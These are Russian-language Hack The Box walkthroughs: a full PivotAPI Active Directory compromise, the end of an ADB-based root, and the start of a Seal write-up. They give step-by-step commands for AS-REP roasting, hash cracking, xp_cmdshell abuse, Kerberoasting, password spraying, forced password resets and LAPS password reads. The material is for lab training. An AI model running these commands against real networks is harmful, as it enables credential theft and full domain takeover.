                              Вывод netstat

Находим порт 5555 и снова отправляемся в Google, чтобы узнать, что за софт
на нем может работать. По первой же ссылке определяем используемое
ПО — это ADB.





                      Поиск информации о порте 5555

ADB (Android Debug Bridge) — клиент‑серверное приложение, которое пре‐
доставляет доступ к работающему эмулятору или устройству. С его помощью
можно копировать файлы, устанавливать скомпилированные программные
пакеты и запускать консольные команды. Используя консоль, можно даже
изменять настройки журнала и взаимодействовать с базами данных SQLite,
которые хранятся на устройстве.
  Для работы нам потребуется одноименное приложение ADB, установить
которое можно командой sudo apt install adb прямо из репозиториев Kali
Linux. Так как порт открыт для локального хоста, прокидываем его через SSH:


ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247

Теперь весь трафик, который мы пошлем на локальный порт 5555, будет тун‐
нелирован на порт 5555 удаленного устройства. Подключаемся.


adb connect 127.0.0.1:5555




                            Подключение к ADB

Соединение успешно установлено, посмотрим идентификаторы подключен‐
ных устройств.


adb devices -l




                       Подключенные к ADB устройства

Из представленного списка нас интересует устройство с идентификатором 2.
Получим командную оболочку, передав идентификатор в параметре -t и ука‐
зав команду shell.


adb -t 2 shell



Мы имеем шелл и по команде su получаем привилегированный контекст.
Остается только найти файл рута.


su
find / -name "root.txt" 2>/dev/null
cat /data/root.txt





                           Флаг рута

Файл найден, и мы получили полный контроль над машиной.
ВЗЛОМ

        HTB
 PIVOTAPI





        БОЛЬШОЙ ПЕНТЕСТ
            ACTIVE DIRECTORY





Сегодня мы разберем «безумную» по слож‐
ности машину с Hack The Box. Она называ‐
ется Pivotapi и посвящена пентесту Active
Directory. Нам предстоит заняться OSINT,
провести  атаку AS-Rep  Roasting, деком‐            RalfHacker                                                                                             hackerralf8@gmail.com
пилировать приложение на .NET, получить
точку опоры через эксфильтрацию данных
из Microsoft SQL, взломать базу KeePass,
проэксплуатировать LAPS для повышения
привилегий и поюзать BloodHound. Прог‐
рамма очень плотная, начинаем немедля!


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА. СКАНИРОВАНИЕ ПОРТОВ
Добавляем IP-адрес машины в /etc/hosts:


10.10.10.240    pivotapi.htb

И сканируем порты.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Мы нашли много открытых портов, давай пройдемся по порядку:
 • 21 — служба FTP (доступен анонимный вход);
 • 22 — служба SSH;
 • 53 — служба DNS;
 • 88 — служба авторизации Kerberos;
 • 135 — служба удаленного вызова процедур (Microsoft RPC);
 • 139 — служба имен NetBIOS;
 • 389, 636, 3268, 3269 — служба LDAP;
 • 445 — служба SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 — служба удаленного вызова процедур (Microsoft RPC над HTTPS);
 • 1433 — Microsoft SQL Server 2019;
 • 9383 — служба шлюзов управления Active Directory.

В итоге мы получаем очень важную информацию. Во‑первых, мы можем
работать со службой FTP без авторизации, а во‑вторых, SQL Server дал нам
имена домена (LICORDEBELLOTA) и текущей машины (PIVOTAPI).
   Давай скачаем все файлы с FTP-сервера для дальнейшего анализа. Сде‐
лаем это с помощью wget:


wget ftp://pivotapi.htb/*

В документах ничего важного для продвижения не нашлось, но тема интерес‐
ная — они описывают способы эксплуатации различных уязвимостей. Но,
как отмечается в любом курсе OSINT (разведка на основе открытых источни‐
ков), если мы смогли получить какие‑либо документы, нас могут заинтересо‐
вать метаданные, а именно атрибуты «создатель» и «владелец». Из них иног‐
да можно узнать имена, подходящие в качестве логинов. Смотреть эти дан‐
ные можно разными методами, я воспользуюсь exiftool (устанавливается
командой sudo apt install exiftool).





                      Свойства документа notes1.pdf

Создав простой конвейер на Bash, получим из всех документов поля Creator
и Author.


exiftool * | grep "Creator\|Author" | awk '{print $3}'





                       Владельцы и создатели файлов

Откинув сомнительные записи, мы можем составить список из пяти воз‐
можных имен пользователей: saif, byron, cairo, Kaorz, alex.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
        HTB PIVOTAPI
            БОЛЬШОЙ ПЕНТЕСТ ACTIVE DIRECTORY





ТОЧКА ВХОДА. AS-REP ROASTING
Так как на хосте работает Kerberos, мы можем проверить, существует ли
какая‑то учетная запись. В этом нам поможет атака AS-Rep Roasting. Смысл
ее в том, что мы посылаем на сервер аутентификации анонимный запрос
для предоставления определенному пользователю доступа к какой‑либо
услуге. Сервер в ответ:
 • предоставляет хеш;
 • отвечает, что у данного пользователя не выставлен флаг UAF Don't
  Require PreAuth;
 • говорит, что такого пользователя нет в базе Kerberos.

Выполнить атаку мы можем с помощью скрипта GetNPUsers, входящего
в состав пакета скриптов impacket. Задаем скрипту следующие параметры:
контроллер домена (-dc-ip), способ аутентификации Kerberos (-k), опция
«без пароля» (-no-pass), список пользователей (-usersfile) и целевой хост
в формате домен/хост.


GetNPUsers.py -dc-ip 10.10.10.240 -no-pass -k -usersfile users.txt
LICORDEBELLOTA/pivotapi.htb





                             Результат работы скрипта

Нам говорят, что, кроме пользователя Kaorz, в базе Kerberos больше никого
нет, причем для учетной записи Kaorz сервер аутентификации вернул нам
хеш! Давай разберемся, что это за хеши и почему их раздают кому попало.
   Дело в том, что, когда клиент посылает сообщение c идентификатором
пользователя на сервер аутентификации и запрашивает доступ к услуге
для какого‑то пользователя, сервер аутентификации смотрит, есть ли поль‐
зователь в базе Kerberos, после чего проверяет его учетные данные. Если
учетные данные неверны, сервер отвечает сообщением UAF Don’t Require
PreAuth.
  Но есть одно ограничение: у учетной записи пользователя может быть
активирован флаг DONT_REQ_PREAUTH, который означает, что для данной учет‐
ной записи не требуется предварительная проверка подлинности Kerberos.
Для этого пользователя учетные данные не проверяются и сервер аутен‐
тификации генерирует секретный ключ, хешируя пароль пользователя, най‐
денный в базе данных. Получается, мы можем пробрутить хеш и узнать
пароль пользователя!
   Брутить хеш будем по словарю программой hashcat. При запуске нам
нужно передать номер типа хеша (параметр -m), поэтому сначала узнаем его,
запросив справку и отфильтровав только нужный нам тип.


hashcat --example | grep krb5asrep -A2 -B2





                         Получение номера типа хеша

Искомый номер — 18200. Теперь запускаем перебор, при этом в параметрах
указываем перебор по словарю (-a 0), тип хеша krb5asrep (-m 18200), файл
с хешем и словарь.


hashcat -a 0 -m 18200 hash.krb5asrep ~/wordlists/rockyou.txt





                             Результат перебора хеша

Очень быстро находим искомый пароль учетной записи Kaorz. Так как у нас
появились учетные данные, нужно попробовать с ними подключиться ко всем
доступным ресурсам. FTP учетных данных не требует, поэтому проверим
SMB. Для этого я обычно использую утилиту smbmap.


smbmap -u Kaorz -p Roper4155 -H 10.10.10.240





                         Доступные ресурсы SMB

В выводе получим список доступных ресурсов SMB и разрешения для каж‐
дого. Чтобы долго не ходить по директориям и не искать интересные файлы,
есть удобная возможность вывести все содержимое ресурсов рекурсивно.
Для этого в smbmap нужно указать опцию -R. Пролистав список, обращаем
внимание на каталог HelpDesk, который содержит исполняемый файл и два
файла msg, то есть какие‑то сообщения.


smbmap -u Kaorz -p Roper4155 -H 10.10.10.240 -R





                     Содержимое каталога HelpDesk

Чтобы заполучить файлы, можем запустить любой  клиент SMB. Я буду
использовать smbclient, поскольку он тоже входит в набор impacket.


smbclient.py LicorDeBellota/Kaorz:Roper4155@10.10.10.240
use NETLOGON
cd HelpDesk
get Restart-OracleService.exe
get Server MSSQL.msg
get WinRM Service.msg
exit





                            Загрузка файлов с SMB




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
        HTB PIVOTAPI
            БОЛЬШОЙ ПЕНТЕСТ ACTIVE DIRECTORY





ТОЧКА ОПОРЫ
Конвертация MSG
Файл .msg содержит электронное письмо в формате Microsoft Outlook и вклю‐
чает данные отправителя и получателя, тему и текст письма. Также в виде
файла .msg может быть сохранена информация о встрече или ином событии
из календаря Outlook, данные контакта из адресной книги, сведения о задаче.
Его можно конвертировать в обычный текстовый формат с помощью утилиты
msgconvert. Но сначала ее следует установить.


sudo apt install libemail-outlook-message-perl libemail-sender-perl
msgconvert Server\ MSSQL.msg
msgconvert WinRM\ Service.msg





                  Содержимое сообщения Server MSSQL





                  Содержимое сообщения WinRM Service

В первом сообщении говорится, что в 2010-е годы была установлена база
Oracle, но в 2020 году решили перейти на MS SQL. При этом найденное при‐
ложение Reset-Service.exe было создано для рестарта службы Oracle. Что
здесь очень важно — это функция логина, то есть приложение работает
с учетными данными.
  Во втором сообщении упоминается блокировка службы WinRM и исхо‐
дящего трафика по протоколам TCP, UDP и ICMP.


Анализ приложения, использующего вызов CMD
Перейдем к анализу третьего файла — исполняемого. Откроем его в любом
дизассемблере (я использую IDA Pro) и первым делом глянем список
импортируемых функций. Это позволит нам составить первое мнение об этой
программе и примерно понять, для чего она нужна.





                      Список импортируемых функций

Обратим внимание на функцию ShellExecuteEx, которая должна выполнять
команды в командной строке. Еще здесь много функций для работы с фай‐
лами (DeleteFile, CreateFile, GetTempPathW и прочие). Чтобы наглядно
отследить работу с файлами и запуск команд, активируем Process Monitor.
После запуска создадим фильтр, который будет отслеживать только наш
целевой процесс.





                          Фильтр Process Monitor

Когда все будет готово, запустим исполняемый файл и просмотрим вывод
Process Monitor.





                        События в Process Monitor

В событиях мы видим создание файлов .tmp и запись (скорее всего, копиро‐
вание) скрипта .bat. Далее создается процесс командного интерпретатора
cmd.exe. А раз он запускается, то мы можем воспользоваться CMDWatcher.
Эта  утилита будет  приостанавливать  процесс и  показывать  аргументы
при запуске CMD в любых процессах. Запустим CMDWatcher, а потом ана‐
лизируемое приложение. Мы увидим, как запускается приложение, а затем —
как активируется сценарий bat.





          Событие запуска приложения Restart-OracleService.exe





                       Событие запуска файла bat

Пройдем в директорию с запускаемым скриптом и увидим в ней сам скрипт
и файл с расширением tmp.





               Содержимое каталога /AppData/Local/Temp/

Заглянем в скрипт. В начале видим проверку на запуск от имени определен‐
ного пользователя. Сразу сохраняем себе его имя — пригодится! Затем дан‐
ные записываются в файл C:\programdata\oracle.txt. Кодировка напоми‐
нает Base64.





                          Содержимое скрипта

После записи создается еще один файл — C:\programdata\monta.ps1, он
содержит код на PowerShell. Этот код  считывает данные из файла C:\
programdata\oracle.txt, декодирует их из Base64 и записывает в C:\
programdata\restart-service.exe. Затем удаляются и файл с данными
Base64, и скрипт на PowerShell и запускается новосозданный исполняемый
файл restart-service.exe. После выполнения он удаляется.





                          Содержимое скрипта

Давай получим этот исполняемый файл для дальнейшего анализа. Для этого
немного модернизируем наш батник: в начале скрипта уберем проверку
пользователей, а в конце — любые удаления файлов (команда del), уберем
также запуск создающегося исполняемого файла.





                  Модернизированный bat-скрипт (начало)





                   Модернизированный bat-скрипт (конец)

Запустим измененный скрипт, после чего проверим каталог C:\programdata,
там нас будет ждать файл с данными, скрипт на PowerShell и целевая прог‐
рамма.



                  Содержимое каталога C:\programdata


Анализ приложения со скрытыми функциями
Исполняемый файл открываем в IDA Pro, чтобы посмотреть импортируемые
функции. Но там не было ничего интересного, а для статического анализа
файл великоват. Именно по этой причине я решил использовать приложение
API Monitor. Оно может отображать все вызовы  API-функций  вместе
с передаваемыми в них аргументами.
   После запуска API Monitor нужно указать целевой исполняемый файл,
для чего выбираем Monitor New Process. В разделе справа увидим все выз‐
ванные приложением функции.





                  Стартовое окно приложения API Monitor





                      Выбор исполняемого файла





                              Результат анализа файла

Часто вызывается GetProcAddress. Дело в том, что DLL может загружаться
приложением не только статически (при запуске), но и динамически (во вре‐
мя выполнения) с помощью функции LoadLibrary. А для получения адреса
функции в загруженной DLL как раз используется функция GetProcAddress,
которая в качестве параметра получает имя импортируемой функции. Эта
техника усложняет статический анализ, а именно скрывает важные функции
из таблицы импорта.
   Давай узнаем, какие функции хотел спрятать разработчик. Для этого необ‐
ходимо установить фильтр, чтобы в выводе присутствовали только функции
GetProcAddress. В контекстном меню выбираем Include → API Name.





                                Установка фильтра





                     Отфильтрованный список функций API

Сразу видим множество функций для работы с реестром, но это пока ничего
не говорит. Чтобы сложить целостную картину, просмотрим абсолютно все
загружаемые функции (это займет 5–10 минут). Во время анализа останав‐
ливаемся на CreateProcessWithLogonW. Это важная функция!





                    Отфильтрованный список API-функций

Она создает новый процесс и его первичный главный поток. Новый процесс
затем запускает заданный исполняемый файл в контексте системы безопас‐
ности определенного пользователя. Дело в том, что эта функция принимает
учетные данные пользователя в качестве аргументов. Давай найдем ее вызов,
чтобы получить эти параметры. Для этого выбираем в окне Display пункт Add
Filter, а затем указываем условие API Name is CreateProcessWithLogonW.





                           Создание фильтра





            Событие вызова функции CreateProcessWithLogonW

Обрати внимание на параметры lpUsername и lpPassword, где содержатся
имя пользователя и его пароль. Так как это учетные данные для сервера базы
данных, попробуем на нем и авторизоваться. Увы, моя первая попытка зайти
как svc_oracle:#oracle_s3rV1c3!2010 провалилась — сервер ответил, что
имя пользователя или пароль неверные.


Выполнение команд через MS SQL Server
Наша находка тем не менее небесполезна! Изучим эти логин и пароль вни‐
мательнее. Часть oracle — это используемое ПО, а 2010 — год установки.
По аналогии с данными для уже отключенной службы Oracle сделаем учетные
данные для MS SQL:
 • пользователь по умолчанию — sa;
 • пароль складывается по шаблону из используемой технологии и года
   установки (которые мы узнали из сообщения): #mssql_s3rV1c3!2020.

Для подключения используем mssqlclient из пакета скриптов impacket.


impacket-mssqlclient sa@pivotapi.htb





                       Подключение к MS SQL Server

После подключения мы можем работать из командной строки, для чего
используем функцию xp_cmdshell.





                          Текущий пользователь




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
        HTB PIVOTAPI
            БОЛЬШОЙ ПЕНТЕСТ ACTIVE DIRECTORY





ПРОДВИЖЕНИЕ
Первый пользователь — svc_mssql и техника runas
Первым делом получим более удобную оболочку, которая к тому же будет
иметь функцию загрузки файлов — mssql_shell. В самом начале скрипта нам
нужно установить свои параметры, такие как логин, пароль и адрес хоста.





                   Измененный исходный код mssql_shell

Выполним код и получим уже более удобную оболочку.



                   Шелл через mssql_shell

Но, попробовав загрузить любой файл, получаем ошибку.





                      Ошибка при загрузке файла

Из лога мы видим пояснение, что ошибка происходит в строке 52. Снова
открываем исходный код и меняем позицию, отвечающую за кодирование
Base64, подключив нужную библиотеку.


# Исходная строка
b64enc_data = b"".join(base64.encodestring(data).split()).decode()
# Измененный код
b64enc_data = b"".join(base64.b64encode(data).split()).decode()





                        Измененный исходный код

Заново подключимся к хосту и повторим загрузку файла командой UPLOAD.
В этот раз она пройдет успешно.





                    Загрузка файла с помощью mssql_shell

На хосте обнаружим безумное количество пользователей — аж глаза раз‐
бегаются! Но среди них есть svc_mssql, пароль которого нам известен.
Однако его домашняя директория нам недоступна, так как мы работаем не в
его контексте.





                          Список пользователей

Для выполнения команд в контексте другого пользователя можно исполь‐
зовать кастомные программы типа runas. К примеру, эту реализацию прог‐
раммы на C#, которая запускается из PowerShell.
   Загрузим  этот  скрипт на  удаленный  хост и  выполним с помощью
PowerShell. В качестве параметров передаем домен, логин и пароль, а также
выполняемую команду — в нашем случае получение списка файлов в домаш‐
ней директории пользователя.


powershell -c ". .\Invoke-RunasCs.ps1 ; Invoke-RunasCs -Username
svc_mssql -Domain LicorDeBellota.htb -Password '#mssql_s3rV1c3!2020'
-Command 'dir C:\Users\svc_mssql\Desktop'"





Команда выполнена успешно, а мы получили путь дальнейшего движения.


Второй пользователь — 3v4Si0N и взлом KeePass
В текстовом файле сказано, что нам нужно перейти с MS SQL на SSH. Второй
файл представляет собой базу хранилища паролей KeePass, поэтому нам
нужно перенести его на локальный хост и попробовать вскрыть. Для эксфиль‐
трации данных закодируем файл в Base64 с помощью certutil, а потом ско‐
пируем полученный текст и декодируем уже на локальном хосте.


# Удаленный хост
powershell -c ". .\Invoke-RunasCs.ps1 ; Invoke-RunasCs -Username
svc_mssql -Domain LicorDeBellota.htb -Password '#mssql_s3rV1c3!2020'
-Command 'certutil -encode C:\Users\svc_mssql\Desktop\credentials.
kdbx C:\Temp\c.txt'"


# Локальный хост
cat creds.kdbx.b64 | base64 -d > credentials.kdbx





                            Эксфильтрация данных

Чтобы открыть этот файл, нам нужно знать пароль, хеш которого есть в файле
зашифрованной базы. Если ты работаешь в специализированном дистри‐
бутиве вроде  Kali Linux, то у тебя уже есть под рукой набор скриптов
для извлечения хешей паролей из файлов разных форматов.


/usr/sbin/keepass2john credentials.kdbx



                      Хеш базы KeePass

А теперь поместим этот хеш в файл и переберем его с помощью John
the Ripper.


john --wordlist=../tools/rockyou.txt kdbx.hash





                             Результат перебора хеша

Далее, если у тебя есть KeePass (а если нет, то ставь его командой apt
install keepassx), открывай файл и ищи там пароль пользователя 3v4Si0n.





                       Список сохраненных паролей





                       Пароль пользователя 3v4Si0n

Спреим найденный пароль для всех пользователей по протоколам SSH
и SMB с помощью crackmapexec. Пароль подошел как к SSH, так и к SMB,
поэтому авторизуемся и забираем первый флаг.


crackmapexec smb pivotapi.htb -u users.txt -p 'Gu4nCh3C4NaRi0N!23'
--continue-on-success



                              Результат перебора SMB


crackmapexec ssh pivotapi.htb -u users.txt -p 'Gu4nCh3C4NaRi0N!23'
--continue-on-success



                              Результат перебора SSH





                       Флаг пользователя


Третий пользователь — Dr.Zaiuss и атака Kerberoasting
Куда двигаться дальше? Инструменты вроде WinPEAS и PowerUp ничего
не дали, значит, нужна более продвинутая разведка, в которой не обойдется
без очень крутой программы — BloodHound. Она использует теорию графов
для выявления скрытых и часто непреднамеренных взаимосвязей в среде
Active Directory. Программа позволяет легко найти очень сложные пути атаки,
которые иначе было бы невозможно быстро идентифицировать.


BloodHound
Изначально саму нагрузку, реализованную на PowerShell или C#, нужно было
запускать на целевом хосте. Но есть и версия на Python, которую можно
использовать прямо с Linux. Скачаем ее с GitHub и установим:


git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install

А теперь соберем информацию с целевого хоста, благо это не займет много
времени. В параметрах указываем учетные данные для подключения, адрес
хоста и тип собираемой информации — нам нужна вся (параметр -c, зна‐
чение all).


bloodhound-python -d LicorDeBellota.htb -u 3v4Si0N -p
'Gu4nCh3C4NaRi0N!23' -gc pivotapi.licordebellota.htb -c all -ns 10.
10.10.240





                                Логи BloodHound

В логах видим, сколько доменов, лесов и компьютеров найдено, сколько
пользователей и групп получено. В результате работы BloodHound в текущей
директории появится несколько файлов. Для работы с ними нужно установить
СУБД Neo4j и графическую оснастку bloodhound, которая будет рисовать гра‐
фы связей.


sudo apt install neo4j bloodhound

Запустим установленную СУБД командой sudo neo4j console.





                                Логи СУБД neo4j

После сообщения об успешном старте зайдем на http://localhost:7474/
через браузер. Нам сразу предложат установить пароль. Делаем это, запус‐
каем BloodHound (команда bloodhound в командной строке) и авторизуемся
с  только что установленным паролем.  Когда  откроется  пустое  окошко,
закидываем в него файлы, полученные в результате работы bloodhound-
python. А затем в графе поиска указываем группу пользователей. На экране
будут отображены все пользователи из этой группы.





                   Все системные пользователи

Найдем в этом списке всех пользователей, контроль над которыми мы уже
имеем: Kaorz, svc_mssql, 3v4Si0N. После выбора этого пользователя в кон‐
текстном меню помечаем его как уже подконтрольного — Mark User as
Owned. На иконке пользователя должен появиться череп. Затем пройдем
в графу аналитики и попросим BloodHound найти путь продвижения к другим
пользователям от уже  взломанных — опция  Shortest  Path from Owned
Principals. Так мы получим маршрут от пользователя 3v4Si0N.





                     Меню аналитики BloodHound





                Путь движения, построенный BloodHound

Мы видим, что объект 3V4SI0N имеет право GenericAll на объект DR.
ZAIUSS. Эта привилегия означает полный контроль одного объекта над дру‐
гим, что позволяет манипулировать свойствами подконтрольного объекта.
Два популярных варианта в этом случае — атака Kerberoasting или смена
пароля целевой учетной записи. Мы пойдем по первому пути.


Атака Kerberoasting
Эта атака возможна потому, что мы можем установить объекту целевой учет‐
ной записи SPN-имя. Реализация протокола Kerberos в Windows использует
имена участников службы (SPN) для определения того, какую учетную запись
задействовать для шифрования билета службы. В Active Directory существует
два варианта SPN: SPN на основе хоста и произвольные SPN. Первый вари‐
ант SPN связан с учетной записью компьютера домена, а второй обычно (но
не всегда) — с учеткой пользователя домена.
   Проще говоря, в случае запроса билета он будет зашифрован паролем
учетной записи, SPN которой было предоставлено. А мы можем установить
SPN для этой учетной записи, тем самым вынудив шифровать билет паролем
учетной записи Dr.Zaiuss. Затем мы его просто пробрутим.
   Чтобы удобнее манипулировать свойствами объектов Active Directory, заг‐
рузим на хост PowerView с помощью scp.


scp PowerView.ps1 '3v4Si0N@pivotapi.htb:C:\Users\3v4Si0N\Documents'

А затем назначим для подконтрольной учетной записи любое SPN, к примеру
nonexistent/RALF.


powershell -c ". .\PowerView.ps1; Set-DomainObject -Identity Dr.
Zaiuss -SET @{serviceprincipalname='nonexistent/RALF'}"

Проверить установленное SPN можно следующей командой. Она запросит
все SPN из домена.


powershell -c ". .\PowerView.ps1; Get-NetUser -SPN | select
samaccountname,serviceprincipalname"

SPN установлено, и пришло время получить билет. Я это сделаю удаленно
с помощью пакета скриптов impacket. При подключении требуются учетные
данные пользователя домена.


GetUserSPNs.py -request -dc-ip pivotapi.htb LicorDeBellota.htb/
3v4Si0N





                              Полученный билет

Данный билет легко брутится с помощью hashcat, для этого нужно лишь ука‐
зать режим 13100 (параметр -m).


hashcat -a 0 -m 13100 ./kerb.hash ../tools/rockyou.txt





                    Подобранный пароль пользователя

Так мы берем под контроль еще одного пользователя. Не забываем отметить
это в BloodHound.


Четвертый пользователь — superfume и password spraying
Снова применяем найденный пароль для всех пользователей. При переборе
SSH ничего найти не удалось, а вот в случае с SMB пароль подошел даже
к двум пользователям!


crackmapexec smb pivotapi.htb -u users.txt -p 'qwe123QWE!@#'
--continue-on-success





              Перебор пользователей для заданного пароля

Осталось только понять, как авторизоваться от лица этого пользователя, ведь
к SSH пароль не подошел. Однако пользователь является членом группы
WinRM, о чем нам говорит граф связей BloodHound.





          Прямое и косвенное отношение пользователя к группам

Нахождение в этой  группе  позволяет нам получить  управление через
PSSession прямо с удаленной машины.


$pass = ConvertTo-SecureString 'qwe123QWE!@#' -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential(
'superfume', $pass)
$session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
-Authentication Negotiate
Enter-PSSession $session





                       Получение сессии пользователя


Пятый пользователь — jari и декомпиляция .NET
Среди групп пользователя также есть и группа Developers. В корне диска C:
есть директория с тем же названием, доступная только этой группе. Там
лежат каталоги двух пользователей: superfume и jari. В своем мы ничего
не находим, а вот у другого пользователя есть исполняемый файл, скорее
всего  написанный на C#.  Сразу просмотрим  этот  код,  вдруг  найдем
еще какие‑нибудь учетные данные.





                 Содержимое каталога C:\Developers\jari





                      Содержимое файла program.cs

Мы все же находим место, где мог бы быть пароль. Но его там нет. Но воз‐
можно, это прототип, а не финальное приложение. К тому же программы
на C# очень легко декомпилируются, поэтому не будем упускать такую воз‐
можность. Для декомпиляции и анализа советую использовать dnSpy. Я
перешел на виртуальную машину Windows, запустил dnSpy и загрузил в нее
бинарный файл. В самом начале программы находим какую‑то строку.





Вряд ли это пароль, но все равно сохраним. Сразу за этой строкой рас‐
положен массив данных, который подлежит расшифровке по алгоритму RC4.
И у нас есть возможность просмотреть строку после того, как процесс будет
закончен. Для этого устанавливаем точку останова на строке с функцией
Decrypt и запускаем отладку приложения.





                      Параметры отладки приложения

Перешагиваем через эту функцию и в таблице локальных переменных получа‐
ем расшифрованный массив.





Скопируем его и используем код на Python, чтобы представить числа в виде
символов.




                        Форматирование массива

Мы получаем какую‑то строку. Снова запустим спреиться найденный пароль.


crackmapexec smb pivotapi.htb -u users.txt -p 'Cos@Chung@!RPG'
--continue-on-success




              Перебор пользователей для заданного пароля

И, как и ожидалось, захватим пользователя jary. Для получения управления
получим сессию PowerShell уже знакомым нам способом.


$pass = ConvertTo-SecureString 'Cos@Chung@!RPG' -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential('jari',
$pass)
$session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
-Authentication Negotiate
Enter-PSSession $session





                       Получение сессии пользователя


Шестой пользователь — gibdeon
После получения контроля над новым пользователем не забываем отметить
наше достижение в BloodHound.
   После перестроения графа обнаружим новый путь к захвату еще одного
пользователя. Это возможно, потому что у нас есть право на сброс и изме‐
нение пароля (ForceChangePassword) пользователя gibdeon.





                       Граф BloodHound

Давай изменим свойство AccountPassword объекта GIBDEON, используя
PowerView. В качестве пароля установим Password123!.


$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText
-Force
Set-DomainUserPassword -Identity GIBDEON -AccountPassword
$UserPassword

После изменения пароля проверим его для служб SSH и SMB.




                       Проверка установленного пароля

Мы можем выполнять команды от имени текущего пользователя.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
        HTB PIVOTAPI
            БОЛЬШОЙ ПЕНТЕСТ ACTIVE DIRECTORY





ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Захватили нового пользователя — отметили это в BloodHound и перестроили
граф.





                      Перестроенный граф BloodHound

На этот раз BloodHound построил маршрут к контексту с высокими привиле‐
гиями за счет пароля LAPS. Группа, в которой мы находимся, имеет привиле‐
гии на управление группой LAPS READ. Добавим себя в эту группу.


$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText
-Force
$Cred = New-Object System.Management.Automation.PSCredential(
'LicorDeBellota.htb\GIBDEON', $SecPassword)
Add-DomainGroupMember -Identity 'Laps Read' -Members 'Gibdeon'
-Credential $Cred

И сразу проверим членов этой группы.


Get-DomainGroupMember -Identity 'Laps Read'





                       Получение пользователей группы

Как видишь, наш пользователь был добавлен в целевую группу.


LAPS
LAPS  (Local  Administrator Password  Solution)  позволяет  централизованно
управлять паролями администраторов на всех компьютерах домена и хранить
информацию о пароле и дате его смены непосредственно в объектах типа
Computer в Active Directory. И наша новая группа дает нам возможность про‐
читать этот пароль администратора.


Get-DomainObject pivotapi -Credential $Cred -Properties
"ms-mcs-AdmPwd",name





                      Получение пароля администратора

Мы получили пароль локального админа и используем psexec, чтобы окон‐
чательно захватить хост.


psexec.py administrador@pivotapi.htb





                           Флаг рута

Мы наконец‑то покорили эту машину!
ВЗЛОМ

       HTB
 SEAL





      ПЕНТЕСТИМ APACHE TOMCAT
         И ЭКСПЛУАТИРУЕМ
           ANSIBLE PLAYBOOK





На этот раз мы с тобой пройдем среднюю
по сложности машину с площадки Hack
The Box. Ты научишься извлекать ценную
информацию из репозиториев  Git, обхо‐
дить контроль доступа HTTP 403, эксплу‐            RalfHacker                                                                                             hackerralf8@gmail.com
атировать Apache Tomcat до уровня выпол‐
нения произвольного кода и повышать при‐
вилегии через Ansible Playbook.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.10.250    seal.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Видим три открытых порта: 22 (служба SSH), 443 (веб‑сервер nginx 1.18.0)
и 8080 (отмечен как HTTP-прокси).

Справка: брутфорс учеток
Поскольку в начале прохождения у нас нет учетных данных, нет и смысла изу‐
чать службы, которые всегда требуют авторизации (например, SSH). Единс‐
твенное, что мы можем делать здесь, — это перебирать пароли брутфорсом,
но у машин с HTB почти всегда есть другое прохождение. В жизни таких вари‐
антов может не быть, к тому же есть шансы подобрать пароль или получить
его при помощи социальной инженерии.



Так как порт 443 работает по протоколу HTTPS, он содержит сертификат, а из
него мы можем узнать, для какого адреса он действителен. Благо его мы уже
добавили в файл /etc/hosts.
   Посмотрим на сами сайты. На первом нас встречает какой‑то одностра‐
ничный маркет с полями для ввода. На втором находим GitBucket. Одного
взгляда достаточно, чтобы определить, с каким из сайтов стоит начинать
работать.





                       Главная страница https://seal.htb





                    Главная страница http://seal.htb:8080


Git
GitBucket — это система для совместной работы с Git-репозиториями,
которая предоставляет интерфейс в стиле GitHub. Здесь можно зарегистри‐
роваться, что мы незамедлительно сделаем.





           Стартовая страница пользователей после авторизации

После этого нам становится доступно некоторое количество проектов. Мы
можем поискать в исходных кодах критические данные вроде секретов,
паролей и прочих интересностей. Также мы можем получить имена поль‐
зователей Git.





                       Пользователи системы GitBucket

Запомним пользователей и пойдем по порядку просматривать репозитории.
Так, в репозитории маркета мы найдем список дел, где среди прочего зап‐
ланирована смена конфигурации Apache Tomcat.





                         Описание репозитория

Это важно, так как мы узнаем о еще одной технологии, которая используется
